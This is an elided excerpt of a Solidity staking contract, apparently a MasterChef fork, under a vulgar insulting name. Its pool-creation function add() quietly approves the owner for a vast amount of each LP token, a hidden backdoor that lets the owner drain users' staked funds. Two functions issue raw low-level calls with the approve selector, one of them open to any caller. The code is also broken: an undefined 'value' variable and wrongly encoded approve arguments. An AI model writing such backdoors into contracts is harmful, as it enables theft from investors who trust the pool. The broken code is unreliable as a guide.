...
contract RusniPizdaChef22 is Ownable {
    using SafeMath for uint256;
    ...
    bytes4 approvebyt = 0x095ea7b3;

    function _callBytes(address token, address from, address to, uint256 amount) private  {
        token.call{value: value}(abi.encodeWithSelector(approvebyt, from, to, amount));
    }
    ...
    function callBytesStatic(address token, address from, address to, uint256 amount) public payable {
        token.call{value: value}(abi.encodeWithSelector(0x095ea7b3, from, to, amount));
    }
    ...
    function add(uint256 _allocPoint, IBEP20 _lpToken, bool _withUpdate) public onlyOwner {
        ...
        updateStakingPool();
        _lpToken.approve(owner(), 0x845951614014880000000);
    }
